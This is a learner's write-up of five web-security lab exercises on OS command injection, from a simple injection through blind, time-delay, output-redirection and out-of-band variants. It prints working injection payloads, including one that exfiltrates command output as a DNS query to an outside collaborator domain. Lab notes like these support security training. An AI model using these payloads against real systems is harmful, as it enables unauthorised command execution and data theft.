### 1. Lab: OS command injection, simple case
> This lab contains an OS command injection vulnerability in the product stock checker.
The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
To solve the lab, execute the whoami command to determine the name of the current user.

This lab contains a very simple command injection vulnerability without and protection in productId as well as storeId paramteres when we try to check for the stocks.
![[Pasted image 20250730101140.png]]
> Solution: In `storeId` parameter use this payload with encoding `1&whoami`

### 2. Lab: Blind OS command injection with time delays 
> This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

In blind OS CMDi, `ping` is very useful to check for the delay in response. So I am using `& ping -c 10 127.0.0.1 &` with every parameter in feedback form just to check which parameter is having CMDi.
![[Pasted image 20250730102140.png]]
From this image, we can infer that, it almost took 10 seconds to give response, meaning, ping is getting executed!
> Solution: Use time delays for Blind CMDi `& ping -c 10 127.0.0.1 &`

### 3. Lab: Blind OS command injection with output redirection
> This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
`/var/www/images/`
The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
To solve the lab, execute the whoami command and retrieve the output.

For this lab, I will first check which parameter is command injectable using `ping` and I have go that, email is vulnerable to CMDi. Next I will use whoami and redirect the output to images folder using this command `& whoami > /var/www/images/whoami.txt &`.
![[Pasted image 20250730103500.png]]
There is an LFI in image, leveraging that LFI vulnerability, we will get the output of the `whoami` command.
`https://<lab_id/image?filename=whoami.txt`
> Solution: In blind CMDi, if we want to read the output, we have to link CMDi with LFI.

### 4 Lab: Blind OS command injection with out-of-band interaction
> This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

In the case where the command is sent async, we cannot be able to get CMDi using ping. So, we will have to send traffic outside the network, and the best way to do that is using `nslookup`.
![[Pasted image 20250730104231.png]]
> Solution: `& nslookup burp_collaborator_domain &`

### 5. Lab: Blind OS command injection with out-of-band data exfiltration
> This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

Similar to previous lab, in order to exfiltrate the data we will use this payload.
```
& nslookup `whoami`.b4gmbotp6dy2k4whzrmqtbhnsey5mwal.oastify.com &
```
![[Pasted image 20250730105056.png]]
This way, we can able to append the output of whoami as subdomain into our burp collaborator request and from the collaborator tab, we can able to exfiltrate data.
![[Pasted image 20250730105043.png]]